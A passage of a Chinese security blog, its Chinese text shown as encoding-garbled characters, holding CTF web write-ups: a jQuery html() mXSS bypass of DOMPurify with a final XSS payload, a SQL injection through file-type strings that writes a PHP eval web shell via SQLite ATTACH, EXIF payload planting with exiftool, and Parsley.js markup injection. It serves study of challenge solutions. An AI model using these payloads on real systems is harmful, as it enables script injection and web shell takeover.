å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰ä»¥ä¸‹åˆ©ç”¨é“¾ï¼š\nhtml()-\u0026gt;append()-\u0026gt;doManip()-\u0026gt;buildFragment()-\u0026gt;htmlPrefilter()\nåœ¨ htmlPrefilter() å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼š\n// source of htmlPrefilter() jQuery.extend( { htmlPrefilter: function( html ) { return html.replace( rxhtmlTag, \u0026#34;\u0026lt;$1\u0026gt;\u0026lt;/$2\u0026gt;\u0026#34; ); }, ... è¿™æ®µä»£ç å°±æ˜¯ç”¨æ¥è½¬æ¢ä¸€äº›è‡ªé—­åˆæ ‡ç­¾çš„æ ‡ç­¾ï¼Œä¾‹å¦‚\u0026lt;blah/\u0026gt;å˜æˆ\u0026lt;blah\u0026gt;\u0026lt;/blah\u0026gt;ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥å®ç°ä¸€äº›ç»•è¿‡ï¼Œä¾‹å¦‚ï¼š\n\u0026lt;style\u0026gt;\u0026lt;style/\u0026gt;Elon ç»è¿‡innerHTMLä¼šå˜æˆ\n\u0026lt;style\u0026gt; \u0026lt;style/\u0026gt;Elon \u0026lt;/style\u0026gt; ä½†æ˜¯ç»è¿‡ jquery html() å°±ä¼šå˜æˆ\n\u0026lt;style\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; Elon æˆ‘ä»¬å¯ä»¥å‘ç°é€šè¿‡html()å¯ä»¥æŠŠä¸€äº›è‡ªé—­åˆçš„æ‹†åˆ†ï¼Œä»¥åŠæŠŠå†…å®¹è½¬æ¢å‡ºå»ï¼Œæœ‰ç‚¹ç±»ä¼¼äº mXSS ï¼Œæœ€ç»ˆæˆ‘ä»¬å¾—åˆ°çš„æ˜¯\n\u0026lt;style\u0026gt;\u0026lt;style\u0026gt;\u0026lt;/style\u0026gt;Elon\u0026lt;/style\u0026gt; æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ç»•è¿‡ XSS WAFï¼Œä¾‹å¦‚ä»¥ä¸‹\n\u0026lt;style\u0026gt;\u0026lt;style/\u0026gt;\u0026lt;script\u0026gt;alert()// ç»è¿‡DOMPurify.sanitizeæˆ‘ä»¬å¯ä»¥å¾—åˆ°\n\u0026lt;style\u0026gt;\u0026lt;style/\u0026gt;\u0026lt;script\u0026gt;alert(1337)//\u0026lt;/style\u0026gt; ç»è¿‡ jquery html()åˆ°æœ€ç»ˆæ¸²æŸ“é¡µé¢å°±å˜æˆäº†\n\u0026lt;style\u0026gt;\u0026lt;style\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert(1337)//\u0026lt;/style\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt; æ‰€ä»¥è¿™å°±æ˜¯ JQuery\u0026rsquo;s ç±»ä¼¼äº mXSS çš„ trick\nç»¼ä¸Šæ‰€è¿°ï¼Œé…åˆæˆ‘ä»¬ä¹‹å‰çš„å†…å®¹ï¼Œæœ€ç»ˆ payload å¦‚ä¸‹ï¼š\n\u0026lt;img name=notify\u0026gt;\u0026lt;style\u0026gt;\u0026lt;style/\u0026gt;\u0026lt;script\u0026gt;alert()// æœ€ç»ˆä¼ å‚:\nimg=valid_img_url\u0026amp;text=\u0026lt;img name%3dnotify\u0026gt;\u0026lt;style\u0026gt;\u0026lt;style%2F\u0026gt;\u0026lt;script\u0026gt;alert()%2F%2F è¿™é‡Œæˆ‘ä¹Ÿä¸æ˜¯éå¸¸æ¸…æ¥šä½œè€…ä¸ºå•¥è¦åŠ ä¸€ä¸ª img å‚æ•°//å…¨ç¨‹æ²¡æœ‰ç”¨åˆ°\næœ€åå†æ¥ä¸€éï¼š\n \nReferences DOM Clobbering\nHTMLAnchorElement\n","date":"2020-02-11T14:47:32Z","permalink":"https://blog.zeddyu.info/2020/02/11/xssgame/","title":"XSS GAME"},{"content":"ç­¾åˆ°é€‰æ‰‹ä¸è¯·è‡ªæ¥ï¼Œç»è¿‡äº†å¥½å‡ å¤©çš„ç¢ç£¨ï¼Œç»ˆäºæŠŠè¿™æ¬¡æ¯”èµ›çš„é¢˜ç›®éƒ½å¼„å¾—å·®ä¸å¤šäº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹æœ¬æ¬¡æ¯”èµ› Web é¢˜ç›®çš„è§£æ³•ã€‚\nå¦‚æœå¸ˆå‚…ä»¬æœ‰æ›´å¥½æ›´æœ‰æ„æ€çš„è§£æ³•ï¼Œæ¬¢è¿å¤šå¤šä¸èœé¸¡äº¤æµã€‚éå¸¸æ„Ÿè°¢ @rebirth @wonderkun @wupco ç­‰å¸ˆå‚…åœ¨æˆ‘å­¦ä¹ æœ¬æ¬¡æ¯”èµ›èµ›é¢˜æ—¶å€™ä¸åŒå…¶çƒ¦åœ°æŒ‡å¯¼æˆ‘ã€‚\nFile Magician  Difficulty estimate: easy\nSolved:133/321\nPoints: round(1000 Â· min(1, 10 / (9 + [133 solves]))) = 70 points\nDescription:\nFinally (again), a minimalistic, open-source file hosting solution.\nDownload:\nfile magician-3ace41f3b0282a70.tar.xz (2.1 KiB)\n ç®—æ˜¯ Web å½“ä¸­çš„ä¸€ä¸ªç­¾åˆ°é¢˜ï¼Œç›´æ¥ç»™å‡º Docker æ–‡ä»¶æºä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°æ­èµ·æ¥è¯•è¯•ã€‚\n\u0026lt;?php error_reporting(0); ini_set(\u0026#39;display_errors\u0026#39;, 0); ini_set(\u0026#39;display_startup_errors\u0026#39;, 0); session_start(); if( ! isset($_SESSION[\u0026#39;id\u0026#39;])) { $_SESSION[\u0026#39;id\u0026#39;] = bin2hex(random_bytes(32)); } $d = \u0026#39;/var/www/html/files/\u0026#39;.$_SESSION[\u0026#39;id\u0026#39;] . \u0026#39;/\u0026#39;; @mkdir($d, 0700, TRUE); chdir($d) || die(\u0026#39;chdir\u0026#39;); $db = new PDO(\u0026#39;sqlite:\u0026#39; . $d . \u0026#39;db.sqlite3\u0026#39;); $db-\u0026gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); $db-\u0026gt;exec(\u0026#39;CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);\u0026#39;); if (isset($_FILES[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; $_FILES[\u0026#39;file\u0026#39;][\u0026#39;size\u0026#39;] \u0026lt; 10*1024 ){ $s = \u0026#34;INSERT INTO upload(info) VALUES (\u0026#39;\u0026#34; .(new finfo)-\u0026gt;file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]). \u0026#34; \u0026#39;);\u0026#34;; $db-\u0026gt;exec($s); move_uploaded_file( $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], $d . $db-\u0026gt;lastInsertId()) || die(\u0026#39;move_upload_file\u0026#39;); } $uploads = []; $sql = \u0026#39;SELECT * FROM upload\u0026#39;; foreach ($db-\u0026gt;query($sql) as $row) { $uploads[] = [$row[\u0026#39;id\u0026#39;], $row[\u0026#39;info\u0026#39;]]; } ?\u0026gt;\u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;file magician\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;form enctype=\u0026#34;multipart/form-data\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;upload\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;table\u0026gt; \u0026lt;?php foreach($uploads as $upload):?\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026lt;?= \u0026#39;/files/\u0026#39; . $_SESSION[\u0026#39;id\u0026#39;] . \u0026#39;/\u0026#39; . $upload[0] ?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?= $upload[0] ?\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;?= $upload[1] ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;?php endforeach?\u0026gt; \u0026lt;/table\u0026gt; é¢˜ç›®åŠŸèƒ½ç‚¹å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶ååœ¨è‡ªå·±çš„ sandbox å½“ä¸­çœ‹åˆ°è‡ªå·±çš„æ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ç”±(new finfo)-\u0026gt;fileæ¥åˆ¤æ–­çš„ï¼Œè¿˜ä½¿ç”¨äº† sqlite è¿›è¡Œå­˜å‚¨æ–‡ä»¶ä¸Šä¼ çš„è®°å½•ã€‚\nç”±äºåˆ›å»ºçš„æ•°æ®åº“è§„å®šäº† id ä¸ºè‡ªå¢é•¿çš„æ•´å‹ä¸»é”®ï¼Œè€Œä¸”å®ƒä½¿ç”¨äº†lastInsertId()è¿”å›æœ€åä¸€æ¬¡ insert æ•°æ®çš„ id ä½œä¸ºæ–‡ä»¶å\nmove_uploaded_file( $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], $d . $db-\u0026gt;lastInsertId()) || die(\u0026#39;move_upload_file\u0026#39;); æ‰€ä»¥æˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥ä¸ç”¨è€ƒè™‘æ˜¯å¦å­˜åœ¨é€šè¿‡å¯æ§æ–‡ä»¶åä¸Šä¼ æ–‡ä»¶ Getshell çš„æ“ä½œäº†ã€‚\nçºµè§‚æ•´ä¸ªæ–‡ä»¶ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å¯æ§åˆ¶çš„è¾“å…¥ç‚¹ä¹Ÿåªæœ‰åœ¨æ–‡ä»¶ç±»å‹å½“ä¸­ï¼Œæ–‡ä»¶ç±»å‹åˆè¢«æ‹¼å…¥åˆ°äº† sql è¯­å¥å½“ä¸­\n$s = \u0026#34;INSERT INTO upload(info) VALUES (\u0026#39;\u0026#34; .(new finfo)-\u0026gt;file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]). \u0026#34; \u0026#39;);\u0026#34;; æ‰€ä»¥æ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œ sql æ³¨å…¥æ¥è¿›è¡Œä¸€äº›æ“ä½œäº†ã€‚\næˆ‘çš„æ€è·¯å°±æ˜¯ fuzz ä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨æŸäº›æ–‡ä»¶ä½¿ç”¨finfoå¾—å‡ºæ¥çš„ç»“æœå«æœ‰å•å¼•å·ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½å¤Ÿæ’å…¥å¯æ§æ•°æ®ï¼Œäºæ˜¯æˆ‘å°±å¼€å§‹ fuzz æ–‡ä»¶å¤´ï¼Œä»0x00åˆ°0xff0xffã€‚\nç»ˆäºåœ¨0x1f0x9då¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯compress'd dataï¼Œè™½ç„¶æœ‰å•å¼•å·ï¼Œä½†æ˜¯ä¸å­˜åœ¨æˆ‘ä»¬å¯æ§çš„æ•°æ®ã€‚\nè¿˜æœ‰ä¸€ä¸ªæ˜¯0xfb0x01å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯QDOS object ''ï¼Œçœ‹èµ·æ¥å¾ˆå¯¹çš„æ ·å­ï¼Œæœ‰ä¸¤ä¸ªå•å¼•å·ï¼Œå¹¶ä¸”æˆ‘ä»¬è²Œä¼¼å¯ä»¥åœ¨å•å¼•å·ä¹‹é—´æ’å…¥æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æµ‹è¯•ä¸€ä¸‹\n \nå‘ç°è¿™é‡Œè¢«åƒæ‰äº†ä¸€ä¸ªpï¼Œäºæ˜¯æˆ‘ä»¬è°ƒæ•´ä¸€ä¸‹ payload å°±å¯ä»¥ç”¨æ¥æ³¨å…¥äº†ã€‚\nsqlite æ˜¯å¯ä»¥ç”¨ .php æ–‡ä»¶åæ¥ä½œä¸ºå­˜å‚¨æ ¼å¼æ–‡ä»¶çš„ï¼Œè€Œä¸”å½“å‰ç›®å½•å¯å†™ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ sqlite attach ä¸€ä¸ª z.php çš„æ–¹æ³•æ¥å†™ shell äº†ã€‚\nATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/* ATTACH DATABASE 'z.php' AS t;insert INTO t.e (d) VALUES ('\u0026lt;?php eval($_POST[a])?\u0026gt;');/* è¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†ä¸¤æ¬¡æ¥å†™ shell\n \nother file çœ‹å…¶ä»–é€‰æ‰‹çš„å…¬å¼€çš„ wp ä¹Ÿæ˜¯å¾ˆæœ‰è¶£çš„ä¸€ä»¶äº‹ï¼Œç„¶åä» ctftime ä¸Šå…¬å¼€çš„ wpï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿˜å­˜åœ¨ç€è¿™ä¹ˆä¸€äº›æ–‡ä»¶å¯ä»¥ç”¨æ¥æ³¨å…¥ã€‚\nTeX DVI file 0xf702 æ–‡ä»¶å¤´ï¼Œåœ¨å¡«å……ä¸€å®šæ•°æ®åæœ‰æˆ‘ä»¬å®Œå…¨å¯æ§çš„æ•°æ®\n \njpeg åœ¨ jpeg çš„ EXIF æ•°æ®æ®µä¸­æœ‰ç”¨æ¥æ ‡è¯† software çš„æ•°æ®ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼ŒåŒæ ·ç”¨æ¥æ ‡è¯† comment çš„åœ°æ–¹æˆ‘ä»¬ä¹Ÿå¯æ§ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ exiftool æ¥ä¿®æ”¹å›¾ç‰‡ã€‚\nexiftool -overwrite_original -comment=\u0026#34;payload\u0026#34; -software=\u0026#34;payload2\u0026#34; 1.jpg  \n#! æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨#!/çš„æ–‡ä»¶æ¥æ„é€  payload\n \ngz åˆ©ç”¨gunzipç”Ÿæˆçš„ gz æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œæˆ‘ä»¬å¯æ§çš„æ•°æ®æ˜¯å®ƒçš„æ–‡ä»¶å\n \nå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹ gz æ–‡ä»¶å†…å®¹\n \nWriteUpBin  Difficulty estimate: medium\nSolved:13/321\nPoints: round(1000 Â· min(1, 10 / (9 + [13 solves]))) = 455 points\nDescription:\nFinally (again), a minimalistic, open-source social writeup hosting solution.\nDownload:\nWriteupBin-10b65573b511269f.tar.xz\n ä¸€é“æ¯”è¾ƒæœ‰æ„æ€çš„ä¾§ä¿¡é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰€ç»™é™„ä»¶æ­å»ºå½¢å¼çŸ¥é“ï¼Œflag å­˜æ”¾åœ¨æ•°æ®åº“å½“ä¸­ï¼Œå¹¶ä¸”æ˜¯åœ¨ admin ç”¨æˆ·çš„ç¬¬ä¸€æ¡ writeup æ•°æ®çš„å†…å®¹å½“ä¸­ï¼Œé¢˜ç›®æä¾›ç®€å•çš„ä¸Šä¼ æ–‡æœ¬çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥æäº¤ç»™ admin ï¼Œè®© admin ç»™ä½ ç‚¹èµã€‚\né¡¹ç›®ç»“æ„å¦‚ä¸‹ï¼š\n. â”œâ”€â”€ Dockerfile\t//Dockeræ–‡ä»¶ â”œâ”€â”€ admin.py\t//ä½¿ç”¨seleniumæ¨¡æ‹Ÿadminç™»å½•å¹¶ç‚¹èµ â”œâ”€â”€ db.sql\t//æ•°æ®åº“æ–‡ä»¶ â”œâ”€â”€ docker-stuff â”‚Â â”œâ”€â”€ default\t//é…ç½®æ–‡ä»¶ â”‚Â â””â”€â”€ www.conf\t//é…ç½®æ–‡ä»¶ â”œâ”€â”€ www â”‚Â â”œâ”€â”€ general.php\t//è¿æ¥æ•°æ®åº“è®¾ç½®headerå¤´ç­‰ä¸€äº›åˆå§‹åŒ–æ“ä½œ â”‚Â â”œâ”€â”€ html â”‚Â â”‚Â â”œâ”€â”€ add.php\t//æ·»åŠ writeupç›¸å…³æ“ä½œ â”‚Â â”‚Â â”œâ”€â”€ admin.php\t//æŠŠwriteupæäº¤ç»™admin â”‚Â â”‚Â â”œâ”€â”€ index.php\t//å…¥å£æ–‡ä»¶ â”‚Â â”‚Â â”œâ”€â”€ like.php\t//ç‚¹èµæ“ä½œ â”‚Â â”‚Â â”œâ”€â”€ login_admin.php\t//adminç™»é™†æ“ä½œ â”‚Â â”‚Â â””â”€â”€ show.php\t//è·å–writeupå†…å®¹ â”‚Â â””â”€â”€ views â”‚Â â”œâ”€â”€ header.php\t//åœ¨é¡µé¢ä¸Šæ–¹å±•ç¤ºç›®å‰idæäº¤çš„writeup â”‚Â â”œâ”€â”€ home.php\t//é¡µé¢ä¸­éƒ¨ç”¨æ¥æä¾›ç»™ç”¨æˆ·è¾“å…¥çš„ç•Œé¢ â”‚Â â””â”€â”€ show.php\t//ç‚¹èµã€æäº¤ç»™adminçš„å±•ç¤ºé¡µé¢ â””â”€â”€ ynetd\t//ç”¨æ¥å¯åŠ¨ admin.py æ—¢ç„¶ flag åœ¨æ•°æ®åº“å½“ä¸­ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é¦–å…ˆæ¥çœ‹çœ‹ show.php ï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç›´æ¥ç”¨æ¥è·å– writeup çš„å†…å®¹ã€‚\n\u0026lt;?php include_once \u0026#39;../general.php\u0026#39;; $stmt = $db-\u0026gt;prepare(\u0026#39;SELECT id, content FROM `writeup` WHERE `id` = ?\u0026#39;); $stmt-\u0026gt;bind_param(\u0026#39;s\u0026#39;, $_GET[\u0026#39;id\u0026#39;]); $stmt-\u0026gt;execute(); $writeup = mysqli_fetch_all($stmt-\u0026gt;get_result(), MYSQLI_ASSOC)[0]; $stmt = $db-\u0026gt;prepare(\u0026#39;SELECT user_id FROM `like` WHERE `writeup_id` = ?\u0026#39;); $stmt-\u0026gt;bind_param(\u0026#39;s\u0026#39;, $_GET[\u0026#39;id\u0026#39;]); $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); $likes = mysqli_fetch_all($result, MYSQLI_ASSOC); include(\u0026#39;../views/header.php\u0026#39;); include(\u0026#39;../views/show.php\u0026#39;); æˆ‘ä»¬å¯ä»¥çœ‹åˆ° id å¹¶æ²¡æœ‰ä»€ä¹ˆé‰´æƒæªæ–½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ writeup id æ¥è·å– writeup å†…å®¹ï¼Œè€Œ flag writeup id åœ¨ admin ç”¨æˆ·æ•°æ®å½“ä¸­ï¼Œè€Œåœ¨ header.php ä¸­å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·æ‰€æœ‰çš„ writeup id\n\u0026lt;?php foreach($writeups as $w): ?\u0026gt;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/show.php?id=\u0026lt;?= $w[\u0026#39;id\u0026#39;] ?\u0026gt;\u0026#34;\u0026gt;Writeup - \u0026lt;?= $w[\u0026#39;id\u0026#39;] ?\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;?php endforeach; ?\u0026gt; æ—¢ç„¶æœ‰æäº¤ä»£ç ç»™ admin çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯æœ‰å¯èƒ½æ˜¯ä¸€ä¸ª xss æˆ–è€…ä»€ä¹ˆçš„ï¼Ÿ\næˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ° admin å†æ”¶åˆ° writeup åçš„ä¸»è¦æ“ä½œï¼š\ndisplay = Display(visible=0, size=(800, 600)) display.start() chrome_options = Options() chrome_options.add_argument(\u0026#39;--disable-gpu\u0026#39;) chrome_options.add_argument(\u0026#39;--headless\u0026#39;) chrome_options.add_argument(\u0026#39;--no-sandbox\u0026#39;) driver = webdriver.Chrome(\u0026#39;/usr/bin/chromedriver\u0026#39;, options=chrome_options) url = \u0026#39;http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id=\u0026#39;+writeup_id driver.get(url) element = driver.find_element_by_xpath(\u0026#39;//input[@id=\u0026#34;like\u0026#34;]\u0026#39;) element.click() driver.quit() display.stop() æˆ‘ä»¬å¯ä»¥çœ‹åˆ° admin åœ¨è¿›è¡Œç™»å½•ä¹‹åä½¿ç”¨find_element_by_xpathæ‰¾åˆ°äº† id ä¸º like çš„ input æ ‡ç­¾ï¼Œå¹¶è¿›è¡Œäº†ç‚¹å‡»ï¼Œä¹Ÿå°±æ˜¯æäº¤ç»™ admin çš„ writeup åï¼Œadmin ä¼šæµè§ˆè¿›è¡Œç‚¹å‡»ï¼Œå‘é€ä¸€ä¸ªç‚¹èµè¯·æ±‚\n\u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;/like.php\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;c\u0026#34; value=\u0026#34;\u0026lt;?= $_SESSION[\u0026#39;c\u0026#39;] ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;id\u0026#34; value=\u0026#34;\u0026lt;?= $writeup[\u0026#39;id\u0026#39;] ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;like\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;ğŸ‘\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹ general.php ä¸­çš„é˜²å¾¡æªæ–½\n\u0026lt;?php session_start([\u0026#39;cookie_httponly\u0026#39; =\u0026gt; true, \u0026#39;cookie_samesite\u0026#39; =\u0026gt; \u0026#39;Strict\u0026#39;]); //... function id() { return bin2hex(random_bytes(8)); } $nonce = base64_encode(id()); //... header(\u0026#39;x-xss-protection: 1; mode=block\u0026#39;); header(\u0026#39;X-Content-Type-Options: nosniff\u0026#39;); header(\u0026#39;x-frame-options: DENY\u0026#39;); header(\u0026#39;Referrer-Policy: no-referrer\u0026#39;); header(\u0026#34;Feature-Policy: geolocation \u0026#39;none\u0026#39;; midi \u0026#39;none\u0026#39;; sync-xhr \u0026#39;none\u0026#39;; microphone \u0026#39;none\u0026#39;; camera \u0026#39;none\u0026#39;; magnetometer \u0026#39;none\u0026#39;; gyroscope \u0026#39;none\u0026#39;; speaker \u0026#39;none\u0026#39;; fullscreen \u0026#39;none\u0026#39;; payment \u0026#39;none\u0026#39;; usb \u0026#39;none\u0026#39;; vr \u0026#39;none\u0026#39;; encrypted-media \u0026#39;none\u0026#39;\u0026#34;); header(\u0026#34;Content-Security-Policy: default-src \u0026#39;none\u0026#39;; script-src \u0026#39;nonce-\u0026#34;.$nonce.\u0026#34;\u0026#39; https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri \u0026#39;self\u0026#39;; form-action \u0026#39;self\u0026#39;; frame-ancestors \u0026#39;none\u0026#39;; require-sri-for script style;\u0026#34;); è€Œscript-srcè®¾ç½®çš„ nonce åªåœ¨ header.php ä½¿ç”¨äº†ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ‹¿ä¸åˆ°è¿™ä¸ª nonce\n\u0026lt;script nonce=\u0026#34;\u0026lt;?=$nonce?\u0026gt;\u0026#34;\u0026gt; $(\u0026#39;#publish-form\u0026#39;).parsley() // prevent hacking \u0026lt;/script\u0026gt; æ‰€ä»¥æˆ‘ä»¬å¯èƒ½éœ€è¦å¾€ç‚¹å‡»äº‹ä»¶é‚£ä¸€æ–¹é¢æ€è€ƒï¼Œå¹¶ä¸”åˆ©ç”¨é¢˜ç›®å¼•å…¥çš„ä¸¤ä¸ª js æ–‡ä»¶å…¥æ‰‹ï¼Œä¸€ä¸ª jquery.js ï¼Œå¦ä¸€ä¸ª parsley.jsã€‚\nParsley.js æˆ‘ä»¬å¯ä»¥å» parsley.js doc çœ‹åˆ°è¯¥ lib çš„ç®€å•è¯´æ˜ä»¥åŠä½¿ç”¨ï¼š\n Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users.\nJavascript form validation is not necessary, and if used, it does not replace strong backend server validation.\nThat\u0026rsquo;s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices.\n å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸ªç®€å•çš„å‰ç«¯éªŒè¯åº“ï¼Œç®€å•æŸ¥ä¸€ä¸‹æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å‡ ä¸ªæœ‰æ„æ€çš„ APIï¼š\n data-parsley-trigger=\u0026ldquo;input\u0026rdquo;\nSpecify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=\u0026ldquo;focusin focusout\u0026rdquo;. Default is null. See the various events supported by jQuery.\ndata-parsley-error-message=\u0026ldquo;my message\u0026rdquo;\nCustomize a unique global message for the field.\ndata-parsley-errors-container=\u0026quot;#element\u0026quot;\nSpecify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source.\n æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨data-parsley-triggerè®¾ç½®æˆ‘ä»¬çš„è§¦å‘æ–¹å¼ï¼Œä½¿ç”¨data-parsley-error-messageæ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œä½¿ç”¨data-parsley-errors-containeræ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„æ˜¾ç¤ºé”™è¯¯çš„ä½ç½®ã€‚\næ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•ç”¨ä¸€ä¸ªdata-parsley-validateæŒ‡å®šæˆ‘ä»¬éœ€è¦éªŒè¯çš„è¡¨å•ï¼Œç„¶ååˆ©ç”¨é”™è¯¯ä¿¡æ¯æŠŠå…ƒç´ æ ‡ç­¾è¾“å‡ºå‡ºæ¥ï¼Œå¹¶ä¸”æˆ‘ä»¬æ¥ç€è¿˜å¯ä»¥åˆ©ç”¨æŒ‡å®šè¾“å‡ºä½ç½®æ¥æ§åˆ¶è¾“å‡ºï¼Œä¾‹å¦‚ï¼š\n\u0026lt;form data-parsley-validate\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; data-parsley-trigger=\u0026#34;blur\u0026#34; autofocus name=\u0026#34;some-field\u0026#34; data-parsley-error-message=\u0026#34;\u0026lt;input id=like type=button value=padyload\u0026gt;\u0026#34; data-parsley-required data-parsley-errors-container=\u0026#34;#div1\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; data-parsley-triggeræŒ‡å®šäº†bluräº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬çš„ input å¤±ç„¦æ—¶ï¼Œä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨ id ä¸º div1 çš„å…ƒç´ ä¸­æ˜¾ç¤ºï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œæµè§ˆå™¨ä¹Ÿå°†å…¶è¿›è¡Œäº†æ¸²æŸ“ã€‚\n \n###Click\nå›åˆ°é¢˜ç›®å½“ä¸­ï¼Œadmin æ‰€åšçš„åŠ¨ä½œæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªå°±æ˜¯ç™»å½•ï¼Œæ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯¹è¿™ä¸ªæ“ä½œæ²¡åŠæ³•è¿›è¡Œä»€ä¹ˆå¹²æ‰°ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ç‚¹èµäº†ï¼Œæ›´å…·ä½“æ¥è¯´å°±æ˜¯é€šè¿‡ show.php 